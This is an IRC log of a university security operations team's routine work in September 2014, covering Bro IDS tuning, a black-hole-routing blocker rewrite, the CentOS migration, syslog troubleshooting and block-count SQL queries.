2014-09-15 11:28:13	wardog	hmm. apparently I exhausted memory on my grep search.
2014-09-15 11:57:07	jazoff	hmm, interstingly, on drought, one of the card already has its license
2014-09-15 11:57:13	jazoff	i guess it programs it into the card
2014-09-15 11:57:58	jazoff	ah, it's the wrong version anyway, i guess V2 license does not work for V3 driver
2014-09-15 12:31:48	wardog	jazoff: have you been keeping an eye on the UDP DDoS policy?
2014-09-15 12:31:52	wardog	For tweaking?
2014-09-15 12:44:59	jazoff	mostly just whitelisted a few things that were FPing
2014-09-15 12:45:39	jazoff	not sure what is up with 141.142.2.2
2014-09-15 12:45:45	jazoff	it wasn't setting off any notices until the upgrade
2014-09-15 12:51:43	eyrich	I sent an email re 141.142.2.2
2014-09-15 12:51:54	eyrich	it was configured wrong
2014-09-15 12:51:56	eyrich	they have fixed it
2014-09-15 13:05:35	jazoff	so 'You would need to purchase Sniffer10G v3 licenses from Sales.  There is a special upgrade price for adapters which have existing Sniffer10G v2 licenses.'
2014-09-15 13:22:04	jazoff	gah, myricom is probably sick of me
2014-09-15 13:22:26	jazoff	they sent me a trial license a while ago, once I was finally ready for it it was expiring they sent me a new one, for the old drought
2014-09-15 13:22:43	jazoff	so I asked for a new one buy pasted them the wrong nicinfo output so they need to give me 2 more
2014-09-15 13:33:25	wardog	Do we have python-requests installed on anything?
2014-09-15 13:35:00	jazoff	yeah
2014-09-15 13:35:34	jazoff	supercell/bro-dev will have it
2014-09-15 13:36:13	wardog	is that a one-off install or done through puppet?
2014-09-15 13:36:24	jazoff	should be done through puppet via yum
2014-09-15 13:41:20	jazoff	drought lives!
2014-09-15 13:41:43	jazoff	so, other than the license issue we could rebuild supercell cluster
2014-09-15 13:41:57	jazoff	we either need to get the v3 licenses or just reinstall v2
2014-09-15 14:21:10	jazoff	so, we aren't scanning that vmware server, but maybe they shouldn't have it sitting on the internet with a public ip?
2014-09-15 14:28:22	wardog	which? what?
2014-09-15 14:32:18	jazoff	A new ticket has been moved into the Security queue. Details are as follows:
2014-09-15 14:32:19	jazoff	   Ticket #: 14425
2014-09-15 14:32:41	jazoff	https://help.ncsa.illinois.edu/Ticket/Display.html?id=14425
2014-09-15 14:44:50	wardog	What right
2014-09-15 14:45:19	wardog	I know we blocked some management IPs in Rob's group during heartbleed.
2014-09-15 14:45:43	eyrich	ya - i cant find that I have ever scanned that server, but if on a public IP without host firewalls the whole world is scanning them
2014-09-15 14:46:47	wardog	jazoff: do you know what other systems, other than the bro ones, are queued for RHEL to CentOS conversion?
2014-09-15 14:46:53	wardog	I guess CIF is one.
2014-09-15 14:49:43	eyrich	wardog: do you want me to replay to the esx ticket?
2014-09-15 14:50:30	wardog	Sure. 1. I did notice a host from China trying to see if it was a proxy. 2. Why is it on a public IP.
2014-09-15 14:51:31	wardog	which yum package has python requests?
2014-09-15 14:52:04	wardog	oh, is it an epel rpm?
2014-09-15 14:54:15	jazoff	probably, all the good stuff is
2014-09-15 14:54:21	wardog	heh
2014-09-15 14:54:22	jazoff	you can also install it using virtualenv
2014-09-15 15:00:33	jazoff	walk time :)
2014-09-15 15:14:14	wardog	don't forget to eat
2014-09-15 15:15:37	jazoff	i had a protein bar
2014-09-15 15:16:20	wardog	what do you need with the myricom drivers?
2014-09-15 15:16:29	wardog	Adam says he has contacts if you need them.
2014-09-15 15:16:40	wardog	or, talk directly to seth apparently
2014-09-15 15:17:20	soehlert	wardog: you can get a decent look at what needs updating still by looking at the hosts file in secops repo. not totally up to date i think, but getting there
2014-09-15 15:17:59	wardog	are all the ips we're supposed to use/reserver in there now or on the wiki page?
2014-09-15 15:18:45	jazoff	say, could we use netdot for that?
2014-09-15 15:21:09	wardog	if there's a usable API, I don't mind.
2014-09-15 15:26:00	jazoff	I wonder if netdot can manage the DNS for our subnet
2014-09-15 15:26:21	jazoff	then it both helps document things and saves time
2014-09-15 15:26:35	jazoff	that's what I did at UA.. I didn't use DHCP but used the netreg system for managing DNS
2014-09-15 15:53:55	soehlert	wardog: ips should be up to date on our private and public subnets
2014-09-15 15:54:23	wardog	in git, right?
2014-09-15 16:10:26	jazoff	i added the ncsabot webhook for the secops repo
2014-09-15 16:10:34	jazoff	so we will get notifictions in #ncsabot now
2014-09-15 16:53:14	soehlert	wardog: yes in git
2014-09-16 10:52:18	jazoff	udp dos alert quiet today :)
2014-09-16 11:16:41	wardog	Do we have a wiki page listing everything we have enabled in bro?
2014-09-16 11:18:08	jazoff	there's one related to BHR
2014-09-16 11:18:14	jazoff	but there is also the config itself
2014-09-16 11:18:15	jazoff	https://git-sec.internal.ncsa.edu/ncsa-security/bro_configs/blob/master/site/ncsa/__load__.bro
2014-09-16 11:20:36	wardog	Guess that makes sense
2014-09-16 11:20:45	wardog	er, works.
2014-09-16 13:17:04	wardog	Anyone know if 141.142.148.105 is being used for anything? It's williwaw.ncsa.uiuc.edu. I'm guessing it's old.
2014-09-16 13:17:10	wardog	Considering 'uiuc.edu'
2014-09-16 13:25:48	eyrich	[eyrich@fog ~]$ ping 141.142.148.105
2014-09-16 13:25:50	eyrich	PING 141.142.148.105 (141.142.148.105) 56(84) bytes of data.
2014-09-16 13:25:50	eyrich	From 141.142.148.15 icmp_seq=1 Destination Host Unreachable
2014-09-16 13:25:50	eyrich	From 141.142.148.15 icmp_seq=2 Destination Host Unreachable
2014-09-16 13:25:50	eyrich	From 141.142.148.15 icmp_seq=3 Destination Host Unreachable
2014-09-16 13:25:50	eyrich	^C^[[A^C
2014-09-16 13:25:50	eyrich	--- 141.142.148.105 ping statistics ---
2014-09-16 13:25:50	eyrich	6 packets transmitted, 0 received, +3 errors, 100% packet loss, time 5654ms
2014-09-16 13:25:50	eyrich	pipe 4
2014-09-16 13:25:50	eyrich	[eyrich@fog ~]$ arp -a |grep 141.142.148.105
2014-09-16 13:25:50	eyrich	williwaw.ncsa.uiuc.edu (141.142.148.105) at <incomplete> on eth0
2014-09-16 13:25:51	eyrich	looks open to me
2014-09-16 13:47:06	soehlert	williwaw can definitely go away
2014-09-16 13:48:36	wardog	good. cause I already sent an email asking to replace the name... I'll update the public_ip.txt list
2014-09-16 14:00:08	wardog	bonilla.ncsa.illinois.edu ?
2014-09-16 14:00:13	wardog	141.142.148.106
2014-09-16 14:00:58	soehlert	that can go
2014-09-16 14:01:04	soehlert	if its not already off
2014-09-16 14:01:36	wardog	dns is not
2014-09-16 15:30:30	jazoff	so with some batching tweaks, new BHR api easily handles 50 blocks/second and there's no lag anymore on the block client
2014-09-16 15:30:49	jazoff	it's now pulling down the block queue 200 ips at a time, so it never gets behind
2014-09-16 15:50:50	soehlert	i thought that said "bitching tweaks" for a second. was much funnier that way
2014-09-16 15:56:06	wardog	jazoff: do you have a library in git for jira access?
2014-09-16 15:56:23	wardog	are you using someone's library?
2014-09-16 15:56:24	jazoff	no.. i use a 3rd party module
2014-09-16 15:56:28	wardog	which one?
2014-09-16 15:56:41	jazoff	python-jira
2014-09-16 15:56:44	wardog	k
2014-09-16 15:57:05	jazoff	https://git-sec.internal.ncsa.edu/ncsa-security/bwbh_user_check/blob/master/check.py#L74
2014-09-16 15:57:46	jazoff	woot. Ran 36 tests in 21.967s
2014-09-16 15:58:06	jazoff	still have a few api functions to add, but always good when adding things doesn't break anything
2014-09-16 15:59:18	jazoff	right now BHR is 536 lines of code and 452 lines of tests
2014-09-17 11:08:01	jazoff	ah, running my perf tests with gunicorn instead of the testing django server it handles 200 blocks/sec with no problem
2014-09-17 15:05:30	jazoff	got the bhr exabgp stuff mostly working
2014-09-17 15:07:14	jazoff	it's really just a few lines of code and a template
2014-09-18 09:10:11	eyrich	where is the best place to see the raw streams of log messages we are receving? without doing net sniff
2014-09-18 09:12:04	jazoff	net sniff like tcpdump?
2014-09-18 09:12:30	eyrich	right 
2014-09-18 09:12:53	eyrich	i do not want to tcpcump, i want to see them at a high layer
2014-09-18 09:13:07	jazoff	oh, well with syslog it's pretty much the same thing
2014-09-18 09:14:13	jazoff	not sure which box would be the one to look at anyway.. more of a jschipp thing
2014-09-18 10:36:00	jschipp	The best way to get the raw messages from the TCP stream is this: tshark -i eth0 -f 'tcp port 514' -d tcp.port==514,syslog -T fields -e syslog.msg Otherwise you could just look at the logs on seclogs /usr/local/logs (no longer raw if processing is done), or I suppose look at Bro 's syslog.log could help but I don't think you'll see everythin
2014-09-18 10:36:51	jschipp	but the tshark command will ONLY print the messages :) 
2014-09-18 10:38:12	jschipp	whoops, do that on relay01
2014-09-18 11:04:42	jschipp	jazoff: do you know if the BroCon14 VM is online anywhere?
2014-09-18 11:04:56	jazoff	yeah, should be in BOX
2014-09-18 11:05:05	wardog	jschipp: This is syslog from RSA on relay01-sec
2014-09-18 11:05:16	wardog	Sep 18 11:04:03 rsaam1.ncsa.illinois.edu 11:04:03,970, , audit.runtime.com.rsa.ims.a......
2014-09-18 11:05:33	wardog	This is it in splunk. Need to check syslogsec
2014-09-18 11:05:39	wardog	Sep 18 11:04:03 rsaam1.ncsa.illinois.edu 11: 04:03,970, 
2014-09-18 11:05:48	wardog	Something is messing it up on our end.
2014-09-18 11:05:51	jazoff	jschipp: 
2014-09-18 11:05:55	jazoff	https://uofi.box.com/s/7tg2hckxfn5qny0eo1cp
2014-09-18 11:06:02	jschipp	thanks
2014-09-18 11:06:21	wardog	Can't ssh to syslog-sec
2014-09-18 11:06:27	wardog	is it down?
2014-09-18 11:06:33	jschipp	it's not a real machine
2014-09-18 11:06:42	wardog	oh right
2014-09-18 11:06:46	wardog	what's the log server name?
2014-09-18 11:06:50	wardog	seclogs?
2014-09-18 11:06:51	jschipp	it's just a virtual IP that forwards to the relays
2014-09-18 11:07:00	jschipp	sniff the same way on seclogs-sec
2014-09-18 11:07:22	jschipp	to see whether it's splunk or the relay
2014-09-18 11:08:00	jschipp	oh wait, the naming convention wasn't followed for that one
2014-09-18 11:08:06	wardog	2014-09-18T11:07:53-05:00 rsaam2.ncsa.illinois.edu 11: 07:53,835
2014-09-18 11:08:09	jschipp	# dig -x 141.142.148.4 +short
2014-09-18 11:08:10	jschipp	seclogs.ncsa.illinois.edu.
2014-09-18 11:08:20	wardog	So when it gets to syslogsec it's messed up.
2014-09-18 11:08:37	jschipp	kk, noted
2014-09-18 11:09:10	jschipp	bastard devices not sending BSD syslog format :/
2014-09-18 11:10:34	jschipp	will look at it
2014-09-19 08:37:10	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Ping timeout)
2014-09-19 09:11:24	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-09-19 14:13:31	soehlert	jazoff: is there something wrong with portal sec?
2014-09-19 14:14:14	wardog	web interface seems fine
2014-09-19 14:15:05	soehlert	weird i cant get to it..my tunnel must be messed up
2014-09-19 14:15:44	soehlert	https://portal-sec.internal.ncsa.edu/ right?
2014-09-19 14:15:49	wardog	And that's a reminder that i need to rebuilt bean.
2014-09-19 14:16:00	wardog	yes
2014-09-19 14:16:00	soehlert	hah not sure how, but that works!
2014-09-19 14:16:09	soehlert	hmm my tunnel is working every where else..
2014-09-19 14:16:13	wardog	were you going to http:?
2014-09-19 14:16:23	soehlert	nope
2014-09-19 14:16:32	soehlert	i just copypastad that from my url bar
2014-09-19 14:18:41	wardog	aaaaand centos 7 installing
2014-09-19 14:19:13	soehlert	ooo shiny
2014-09-19 14:19:37	wardog	yikes. interface naming convention is different
2014-09-19 14:19:42	wardog	ens32 = eth?
2014-09-19 14:20:16	soehlert	ugh god i hate when they do that!
2014-09-19 14:20:20	soehlert	i have no idea 
2014-09-19 14:20:30	soehlert	i should say, i had figured it out, but dont remember
2014-09-19 14:20:31	jazoff	yeah, it's better for servers
2014-09-19 14:20:36	jazoff	dell pushed a lot of that stuff i think
2014-09-19 14:21:41	soehlert	which is funny because they use the em stuff on our dell servers
2014-09-19 14:23:24	wardog	xfs is the default fs
2014-09-19 14:24:10	soehlert	yup
2014-09-19 14:27:27	jazoff	soehlert: yeah, but then on bro-dev boxes you get p1p1 
2014-09-19 14:27:42	soehlert	well those are weird because of the 10G nics. 
2014-09-19 14:27:58	soehlert	which of course is a different naming system than the 10G nics in the HPs too..
2014-09-19 14:28:11	wardog	Do those nics have multiple interfaces?
2014-09-19 14:28:20	jazoff	yeah, you get p1p1 p1p2 i think
2014-09-19 14:29:13	jazoff	which does make sense, em1 is embeded, p1p1 is pci 1 port 1
2014-09-19 14:30:28	soehlert	ahhh ha i never made that connection
2014-09-19 14:32:29	wardog	wait. You mean there's a logical naming convention?
2014-09-19 14:32:55	wardog	Some of my systems often have trouble deciding who's eth0 and who's eth1. Although, they are really old.
2014-09-19 14:35:17	wardog	https://uofi.box.com/s/t1qnebqh529mf5aqoom3
2014-09-19 14:36:12	wardog	Made this the other day too. https://uofi.box.com/s/6r3dldvopdx2ulm9u2xb
2014-09-19 14:38:23	soehlert	thats got a definite hieroglyphics(?) feel to it
2014-09-19 14:38:34	wardog	eye or horace
2014-09-19 14:38:37	wardog	of
2014-09-19 14:42:54	wardog	systemctl.....
2014-09-19 14:44:26	wardog	this iptables wrapper is gonna take time getting used to
2014-09-19 14:45:13	jazoff	wardog: yeah, that stuff is supposed to fix that
2014-09-19 14:45:46	jazoff	for a while ubuntu/debian used the udev stuf that remembered nics by mac address, which at least solves the problem of things like hotplug USB or a bios update changing the order they are detected
2014-09-19 14:45:59	jazoff	but doesn't help when you swap out a broken card and it changes from eth2 to eth3..
2014-09-19 14:46:05	wardog	so.... ifconfig isn't installed during minimal install. It's in the net-tools packages, is there a new tool for this or do I just install net-tools?
2014-09-19 14:46:08	jazoff	the p1p1 notation will follow the slot, not the card
2014-09-19 14:46:12	jazoff	wardog: ip ?
2014-09-19 14:46:15	soehlert	ip addr
2014-09-19 14:46:19	wardog	ah
2014-09-19 14:46:20	soehlert	ifconfig is deprecated
2014-09-19 14:47:26	wardog	alright. this works.
2014-09-19 14:51:24	wardog	https://www.youtube.com/watch?v=IZRWx70E97M
2014-09-19 14:51:31	soehlert	jazoff: can you help me figure out why i cant get to the portal? I need to vet a host today
2014-09-19 14:55:06	jazoff	oh, you are not tunneling through fog are you?
2014-09-19 14:55:29	jazoff	can you telnet portal-sec.internal.ncsa.edu 443 ?
2014-09-19 14:57:17	soehlert	i am tunneling through fog thats how ive always done it
2014-09-19 14:57:46	wardog	oh. also, we just got approved to issue ncsa.edu certificates. If you want valid certificates for host.internal.ncsa.edu hosts, we can do that now.
2014-09-19 14:57:50	jazoff	wellll, I am too and it works for me...
2014-09-19 14:57:57	wardog	me too
2014-09-19 14:58:04	jazoff	so what are you doing differently ? :)
2014-09-19 14:58:21	wardog	Wrong browser? Something not using your pac file?
2014-09-19 15:01:39	soehlert	hah i dunno
2014-09-19 15:01:39	soehlert	using the same browser i always use (FF since that has the pac file loaded) i didnt change my pac file since yesterday when i used it
2014-09-19 15:03:15	soehlert	screw it i dont have time to mess with that part right now. i'll just grab the vetting info and save it locally. put it in the portal later
2014-09-19 15:03:26	soehlert	warren, sending you and adam and email about the DSS stuff as well just a heads up
2014-09-19 15:03:35	wardog	thanks
2014-09-19 15:04:14	jazoff	ok. dog walk +food:)
2014-09-19 15:07:23	wardog	weechat right?
2014-09-19 15:07:44	soehlert	thats what i use and jazoff too
2014-09-19 15:08:09	wardog	gonna try that out on the new systme
2014-09-19 15:23:07	jazoff	yeah, takes a few to get setup, but has some really nice features that irssi doesn't have
2014-09-19 15:23:53	wardog	aaaand built
2014-09-19 15:26:36	wardog	aaaand all dependencies met...
2014-09-19 15:53:43	wardog	sooooo. systemctl restart sshd.service doesn't appear to do anything. Even running 'stop' doesn't actually stop sshd
2014-09-19 15:56:39	wardog	oh... interesting.
2014-09-19 16:12:44	jazoff	hmm?
2014-09-22 08:44:42	wardog	Just how systemctl works. I guess I needed to reload instead of just restarting the service.
2014-09-22 08:45:04	jazoff	odd
2014-09-22 08:45:31	jazoff	I have systemd on my laptop though I tend to just the older commands via the compatibility layer
2014-09-22 08:45:53	wardog	rhel also redirects to systemctl when you try to use service.
2014-09-22 08:59:38	wardog	bhrhistory takes a long time to load, if at all, on portal-sec
2014-09-22 08:59:41	wardog	oh, there it goes
2014-09-22 09:02:35	jazoff	yeah, it uses splunk
2014-09-22 09:02:57	jazoff	the new system will be much faster :)
2014-09-22 09:23:45	wardog	I guess it depends on the service...
2014-09-22 09:23:53	wardog	sshd needed a reload to pick up config changes.
2014-09-22 09:24:05	wardog	rsyslog needs a restart to do the same, doesn't recognize reload.
2014-09-22 09:24:13	jazoff	that seems not right :)
2014-09-22 09:24:24	jazoff	since restart implies reload
2014-09-22 09:38:48	soehlert	i think restart always works, but reload only sometimes works
2014-09-22 09:39:54	soehlert	all reloads are restarts but not all restarts are reloads and all that
2014-09-22 09:43:41	wardog	which is why I was confused when restart didn't load the updated ssh config but reload did.
2014-09-22 09:45:20	soehlert	ahh whoops i missed that. thats messed up
2014-09-22 09:48:38	wardog	slightly.
2014-09-22 09:49:24	eyrich	wardog: did you move the iforge page and share?
2014-09-22 09:52:57	wardog	crap
2014-09-22 09:52:59	wardog	doing now
2014-09-22 09:53:26	wardog	This one? https://wiki.ncsa.illinois.edu/display/CSD/iForge+-+Questions+for+Management
2014-09-22 09:57:14	eyrich	yes
2014-09-22 10:10:28	wardog	ok, moved. https://wiki.ncsa.illinois.edu/display/SecOps/iForge+-+Questions+for+Management
2014-09-22 10:10:43	wardog	org_psp alright or should I give a different group perms?
2014-09-22 10:30:45	eyrich	psp seems right
2014-09-22 10:31:02	wardog	Alright, well, if they need anyone else in we can change perms.
2014-09-22 10:31:08	eyrich	ok thanks
2014-09-22 12:05:24	wardog	soehlert: jazoff: jschipp: what's the status of CentOS migration?
2014-09-22 12:06:34	jazoff	myricom drivers somewhat blocking the bro migration
2014-09-22 12:06:45	jazoff	unless we just reinstall the current version of the driver
2014-09-22 12:09:07	wardog	cif, bro.. what else is left?
2014-09-22 12:09:28	soehlert	fog/dew, the bro cluster, warm/cool
2014-09-22 12:09:33	soehlert	lemme check
2014-09-22 12:11:06	soehlert	lowp, brosshd, flows-sec, cyclone, tempest, monsoon
2014-09-22 12:12:28	wardog	so, mostly internal systems.
2014-09-22 12:12:35	wardog	except the CA stuff.
2014-09-22 12:17:14	soehlert	yes, and since we did tepid last week and figured out the process, warm and cool should be easier. those are my next two
2014-09-22 12:17:53	wardog	cool. (no pun) thanks.
2014-09-22 12:32:17	soehlert	jazoff: so what are the options for the myricom stuff again? buy licenses for 3 or just roll back to 2?
2014-09-22 12:36:32	jazoff	yeah.. seth may be able to get us licences for 3 somehow though
2014-09-22 12:37:14	eyrich	where is the bets place to see logs ad they are coming it? - BTW: relay01 is not an answer because it is not guarnteed to have all the streams
2014-09-22 12:39:01	soehlert	seclogs
2014-09-22 12:39:18	eyrich	what file /var/log/messages it is not
2014-09-22 12:39:42	wardog	you can also check splunk.
2014-09-22 12:39:44	soehlert	no its not
2014-09-22 12:39:44	soehlert	/usr/local/logs/yyyy/mm/dd/
2014-09-22 12:39:47	soehlert	and then its by host
2014-09-22 12:39:49	wardog	It should get everything seclogs gets.
2014-09-22 12:39:51	soehlert	oh ya or splunk
2014-09-22 12:39:51	eyrich	thanks
2014-09-22 12:41:59	eyrich	thanks soehlert
2014-09-22 12:42:04	eyrich	thats what I needed - seeing the logs life
2014-09-22 12:42:05	eyrich	live
2014-09-22 12:45:38	jschipp	wardog: I have to nagios yet. Probably won't do it this week becaue I'll be out for Derbycon
2014-09-22 12:45:59	soehlert	unfortunately the centos seclogs is still having issues receiving things. :/ gonna have to dig into that one
2014-09-22 13:02:35	wardog	Most of our HP production hosts are still under extended warranty right?
2014-09-22 13:02:51	wardog	Found it
2014-09-22 13:13:33	soehlert	jazoff: best practices...should you run docker as root? is it possible to not?
2014-09-22 13:13:48	eyrich	wardog: yes
2014-09-22 13:20:50	jazoff	soehlert: you can set it up so you don't need to be root to run it
2014-09-22 13:21:00	jazoff	but that basically gives that user root access to the machine
2014-09-22 13:22:40	soehlert	so its better to run docker as root and have lower privileges inside the container i would think then right?
2014-09-22 13:25:13	jazoff	the docker command just talks to the docker daemon which always runs as root
2014-09-22 13:25:20	jazoff	the user you run the docker command as doesn't change the end result
2014-09-22 13:27:53	soehlert	ah i meant the daemon sorry, but that makes sense.
2014-09-22 13:28:37	soehlert	so basically if i want to make sure the container is secure, i just need to vet the image and take note of how the eth bridge is set up?
2014-09-22 13:32:43	jazoff	well there is https://blog.docker.com/2013/08/containers-docker-how-secure-are-they/
2014-09-22 13:34:27	soehlert	ya i saw that. and basically theres nothing you can do to change the intrinsic security of a container, so really it just comes down to securing inside the container like you owuld any host right?
2014-09-22 13:35:17	jazoff	yeah, though they are some things you can do..
2014-09-22 13:35:26	jazoff	like avoid running things as root in the container
2014-09-22 13:35:32	jazoff	and don't bind mount things r/w
2014-09-22 13:41:59	soehlert	k thanks
2014-09-22 13:43:08	jazoff	is this for that ie node website thing?
2014-09-22 13:44:48	soehlert	ya
2014-09-22 13:45:20	jazoff	one question I had about that is if the container bypasses any ip based security controlls based on the zone the host is in
2014-09-22 13:45:54	jazoff	i don't think it does, but it would be an issue
2014-09-22 13:49:00	soehlert	there shouldnt be any of those in zone 1. i need to double check now because thats a smart question to ask, but zone 1 hosts aren't fw'd
2014-09-22 13:57:53	soehlert	jazoff: isnt there a way to ssh into a docker container directly? this container doesnt seem to be running sshd
2014-09-22 14:01:53	jazoff	no
2014-09-22 14:02:05	jazoff	only if the container actually starts sshd, which is not recommended
2014-09-22 14:02:18	jazoff	there's a tool you can get called nsenter that will drop you into the namespace the container is in
2014-09-22 14:02:36	jazoff	(though, facebook uses containers and apparently all of theirs have ssh)
2014-09-22 14:03:28	soehlert	hmm so without that tool and without sshd running how can i see what the procs are running as and check on the bind mount thing?
2014-09-22 14:06:37	jazoff	docker ps, docker inspect
2014-09-22 14:06:45	jazoff	docker top
2014-09-22 14:09:12	soehlert	perfect thanks
2014-09-22 14:22:13	wardog	nc -v nyancat.dakko.us 23
2014-09-22 14:22:17	wardog	reset after.
2014-09-22 14:29:48	wardog	which bro notices do we block on specifically?
2014-09-22 14:32:17	jazoff	https://wiki.ncsa.illinois.edu/display/CSD/Black+Hole+Routing
2014-09-22 14:32:43	jazoff	or https://git-sec.internal.ncsa.edu/ncsa-security/bro_configs/blob/master/site/ncsa/bhr-types.bro
2014-09-22 14:44:30	wardog	thnx
2014-09-22 15:27:27	jazoff	https://twitter.com/BeckmanInst
2014-09-22 15:27:29	jazoff	so that's what that thing is
2014-09-22 15:28:00	wardog	yep. Multiple functions.
2014-09-22 15:28:16	soehlert	ahhhh
2014-09-22 15:28:17	wardog	equinox and both solices and for finding the north star
2014-09-22 15:31:45	wardog	https://secure.flickr.com/photos/warquel/4377211116/in/photolist-7ENmnb-7DLQpk
2014-09-22 15:36:39	soehlert	perfect
2014-09-22 15:36:50	soehlert	never noticed that thing before explaining how it works..
2014-09-23 10:58:28	wardog	I don't see cygnus logs in seclogs
2014-09-23 10:58:44	wardog	I can see them in splunk
2014-09-23 10:59:18	soehlert	hmm i wonder if they are only being sent to splunk or if there is an issue.
2014-09-23 11:00:54	wardog	I see almost 1.2k unique hosts in splunk but only about 98 in seclogs.
2014-09-23 11:01:01	wardog	and the historical logs look kinda small.
2014-09-23 11:02:34	soehlert	hmmm that doesnt sound on purpose then.
2014-09-23 11:08:46	wardog	I also don't see cygnus logs in Splunk until September. Not sure if they fell off or only just stared.
2014-09-23 11:08:49	wardog	started.
2014-09-23 11:09:35	wardog	I can find Bro blocks using the NOtice logs in Splunk, not so lucky finding OSSEC blocks. Maybe smtp logs....
2014-09-23 11:10:46	wardog	wait... OSSEC would come from tempest, right?
2014-09-23 11:11:03	eyrich	ossec blocks are who= secops
2014-09-23 11:11:20	wardog	Yeah, but no cygnus logs from before sept.
2014-09-23 11:11:23	wardog	I need to back to July
2014-09-23 11:12:02	wardog	Not sure how to access the DB to do a direct search.
2014-09-23 11:15:27	wardog	9/10/14 is the first OSSEC BHR reference in splunk.
2014-09-23 11:21:19	jazoff	yeah.. the retention in splunk is not very high
2014-09-23 11:31:06	wardog	can you pull the number of unique blocks by OSSEC per month (Jul,Aug)
2014-09-23 11:32:06	jazoff	yeah, the sql db goes back taht far
2014-09-23 11:35:46	jazoff	        month        | count
2014-09-23 11:35:47	jazoff	---------------------+-------
2014-09-23 11:35:47	jazoff	 2014-01-01 00:00:00 |    14
2014-09-23 11:35:47	jazoff	 2014-02-01 00:00:00 |    57
2014-09-23 11:35:47	jazoff	 2014-03-01 00:00:00 |    68
2014-09-23 11:35:49	jazoff	 2014-04-01 00:00:00 |    88
2014-09-23 11:35:51	jazoff	 2014-05-01 00:00:00 |   189
2014-09-23 11:35:54	jazoff	 2014-06-01 00:00:00 |   167
2014-09-23 11:35:56	jazoff	 2014-07-01 00:00:00 |   261
2014-09-23 11:35:59	jazoff	 2014-08-01 00:00:00 |   324
2014-09-23 11:36:01	jazoff	 2014-09-01 00:00:00 |   134
2014-09-23 11:36:21	jazoff	via select month, count(1) from (select date_trunc('month', block_when) as month from blocklog where block_who='secops') as foo group by month order by month asc;
2014-09-23 11:38:31	wardog	thanks
2014-09-23 11:38:43	wardog	Will need to pull this months on the 1st.
2014-09-23 11:39:05	wardog	Looks like I should be able to pull it from Splunk after this month.
2014-09-23 11:44:19	wardog	sigh...
2014-09-23 11:44:34	wardog	Can you get bro block by type for July
2014-09-23 11:44:46	wardog	Looks like Splunk goes back to 7/13.
2014-09-23 11:44:59	wardog	Well, do July and Aug.
2014-09-23 11:45:27	wardog	type meaing port scan vs address vs subnet vs ssh
2014-09-23 11:48:02	jazoff	hmm
2014-09-23 11:53:39	wardog	I wonder if local logs on Cygnus go that far back.
2014-09-23 11:55:59	jazoff	need to figure out how you split a string in postgres, then i'll have teh data...
2014-09-23 11:56:15	jazoff	it's stored as 'Scan::Address_Scan: 24.49.34.27 scanned at least 27 unique hosts on port 80/tcp in 3m35s' and i just want the first part
2014-09-23 11:56:32	wardog	You could just take the first X letters of the string, whatever makes it unique, and do that.
2014-09-23 11:57:40	wardog	trim function?
2014-09-23 11:58:21	jazoff	ah, (string_to_array(block_why, ' '))[1] works
2014-09-23 12:00:08	jazoff	 2014-07-01 00:00:00 | Scan::Address_Scan:                |  59955
2014-09-23 12:00:08	jazoff	 2014-07-01 00:00:00 | Scan::Port_Scan:                   |     46
2014-09-23 12:00:08	jazoff	 2014-07-01 00:00:00 | SSH::Bad_Client_Password_Guessing: |    109
2014-09-23 12:00:08	jazoff	 2014-07-01 00:00:00 | SSH::Subnet_Scanner:               |     75
2014-09-23 12:00:08	jazoff	 2014-08-01 00:00:00 | Scan::Address_Scan:                | 198478
2014-09-23 12:00:11	jazoff	 2014-08-01 00:00:00 | Scan::Port_Scan:                   |     40
2014-09-23 12:00:14	jazoff	 2014-08-01 00:00:00 | SSH::Bad_Client_Password_Guessing: |   1918
2014-09-23 12:00:16	jazoff	 2014-08-01 00:00:00 | SSH::Subnet_Scanner:               |    582
2014-09-23 12:00:29	wardog	huh...
2014-09-23 12:00:35	jazoff	via select month, reason, count(1) from (select date_trunc('month', block_when) as month, (string_to_array(block_why, ' '))[1] as reason from blocklog where block_who='bro') as foo group by month, reason order by month,reason;
2014-09-23 12:00:40	jazoff	is that not what you were looking for?
2014-09-23 12:00:53	jazoff	also, that should potentially be deduped on ip?
2014-09-23 12:00:54	wardog	Looks like the same data I got from splunk. For July
2014-09-23 12:01:35	wardog	Meaning, it looks like this DB goes back to 7/13 as well.
2014-09-23 12:02:17	wardog	Maybe that's when we started pushing these to syslog?
2014-09-23 12:03:10	jazoff	I don't remember :)
2014-09-23 12:03:36	wardog	Hmm.. These numbers are also a little off from what I'm seeing in Splunk.
2014-09-23 12:04:04	wardog	e.g. portscan, splunk=59, db=40
2014-09-23 12:04:23	wardog	address splunk=133805, db=198,478
2014-09-23 12:04:34	wardog	So.... weird.
2014-09-23 12:04:44	soehlert	for the same time frame?
2014-09-23 12:04:49	wardog	Yep
2014-09-23 12:05:09	wardog	I'll use the DB numbers...
2014-09-23 12:06:20	wardog	jazoff: are you accessing the db locally or remotely?
2014-09-23 12:06:27	jazoff	locally
2014-09-23 12:06:53	wardog	can you create a cron job to push these numbers into syslog on the first of the month?
2014-09-23 12:07:02	wardog	OSSEC and Bro blocks numbers?
2014-09-23 12:07:10	jazoff	i don't see why not
2014-09-23 12:07:20	wardog	I think that would be the easiest way to get the data.
2014-09-23 12:07:50	wardog	In case there are lost logs going to splunk.
2014-09-23 12:14:59	jazoff	new bhr stuff coming along :)
2014-09-23 12:15:07	wardog	yay
2014-09-23 12:15:08	jazoff	need to finish implementing the query/unblock pages
2014-09-23 12:15:24	wardog	You gonna add rrd graphs? j/k
2014-09-23 12:15:29	jazoff	you should be able to search by cidr or by 'who'
2014-09-23 12:15:38	jazoff	heh, I could pretty easily add a basic graph
2014-09-23 12:16:35	jazoff	i think I will end up implementing the block list page using angular..
2014-09-23 12:16:48	jazoff	a common usecase is something like query for 'foo' and unblock anything that shows up
2014-09-23 12:16:59	jazoff	and doing that with regular html forms and full page reloads becomes not fun
2014-09-23 12:18:34	jazoff	other things still TODO are adding in the block scaling code and things like the digest emails
2014-09-23 12:18:53	soehlert	i must have missed it, what prompted this major rewrite?
2014-09-23 12:19:02	jazoff	block scaling code will likely be 10 lines of code and 100 lines of tests
2014-09-23 12:20:09	jazoff	cites wants BHR, but the current architecture isn't very flexible and doesn't have a great api
2014-09-23 12:20:17	soehlert	ah gotcha
2014-09-23 12:20:19	jazoff	there's some notes on https://wiki.ncsa.illinois.edu/display/CSD/Black+Hole+Routing
2014-09-23 12:20:50	jazoff	of that, I have the http api, whitelist, multiple blockers, flag field implemented
